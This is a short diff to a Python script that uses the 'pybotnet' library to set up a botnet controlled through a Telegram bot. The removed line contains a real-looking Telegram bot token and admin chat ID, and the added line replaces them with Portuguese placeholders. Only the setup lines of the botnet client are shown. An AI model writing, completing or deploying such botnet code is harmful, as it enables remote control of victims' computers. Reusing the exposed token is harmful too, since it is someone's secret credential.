@@ -1,6 +1,6 @@
 from pybotnet import BotNet,TelegramEngine
 
-telegram_engine = TelegramEngine(token="5986172966:AAHTLBf4VDaB8b1Bbx_ZZnc0_IPmwS5N0mM", admin_chat_id="5671962308")
+telegram_engine = TelegramEngine(token="token que bot gera", admin_chat_id="id do teu telegra")
 
 
 botnet = BotNet(telegram_engine) # 
